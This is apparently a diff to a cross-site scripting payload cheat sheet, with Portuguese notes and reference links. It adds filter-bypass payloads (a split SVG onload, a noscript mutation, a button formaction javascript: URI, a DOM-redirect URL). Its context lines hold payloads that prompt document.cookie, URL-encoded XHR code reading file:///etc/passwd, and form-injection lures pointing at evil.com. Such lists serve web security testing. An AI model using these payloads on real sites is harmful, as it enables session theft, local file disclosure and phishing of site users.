@@ -4,16 +4,17 @@
 <input onfocus=alert(1) id=x>
 <input onfocus=alert(1)>
 <input onblur=alert(1)>
+<svg o<script>nload=alert(1)>
 
 
 
-
-
+<noscript><p title="</noscript><img src=x onerror=alert(1)>"></p></noscript>
 <input type="hidden"  accesskey="x" value="XSS">
 <link rel="caconical" accesskey="X" onclick="alert(1)" />
 <a href=//google.com><font size=100 color=red>CLICK ME</font></a><base target="
 <input name=x type=hidden form=x value="&lt;a href=//evil.com&gt;&lt;font size=100 color=red&gt;Click me second&lt;/font&gt;&lt;/a&gt;"><button form=x><font size=100 color=red>Click me first</font></button><form id=x target="
 <input name=x type=hidden form=x value="&lt;a href=//evil-com&gt;&lt;font size=100 color=red&gt;Click me second&lt;/ font&gt;&lt;/a&gt;"><button form=x><font size=100 color=red>Click me first</font></ button><form id=x target="
+<form id="test"></form><button form="test" formaction="javascript:alert(1)">X</button>
 
 
 alert``
@@ -36,6 +37,7 @@ URI-SCHEME
 javascript:alert(1)
 javasc%0aript%3aalert(1)
 javas%0a%0dcript%3aalert(1)
+/**/alert(1)
 j%0aavascript://www.hackdog.me/%0a%0dprompt(document.cookie)
 javascript://www.hackdog.me/%0a%0dprompt(document.cookie)
 javascript://www.hackdog.me/%0a%0d%28function%28s%29%7B
@@ -50,6 +52,10 @@ oReq.addEventListener(%22load%22%2C%20reqListener)%3B%0A
 oReq.open(%22GET%22%2C%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22)%3B%0A
 oReq.send()%3B
 data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4=
+https://vulnerabledoma.in/bypass/dom_redirect#javascript:alert(2)
+
+
+
 
 ------------------------------------------------------------------------------------------------------
 Para testar payloads que contenham javascript, escreva no navegador:
@@ -98,6 +104,12 @@ More:
 https://www.slideshare.net/GarethHeyes/xss-magic-tricks?fbclid=IwAR1DZL2fu-3UGTUyUJnleAP0CFhN_1TuFZCwVH0acEx8QEvABrtacVg_bCE
 https://conference.hitb.org/hitbsecconf2017ams/materials/D2T2%20-%20Yu%20Hong%20-%20Attack%20Surface%20Extended%20by%20URL%20Schemes.pdf
 https://www.google.com/search?rlz=1C&q=uri-scheme+xss&oq=uri-scheme+xss
+https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet
+https://twitter.com/kinugawamasato
+https://xssor.io/s/payload/xssmisc.txt
+
+
+
 
 
 
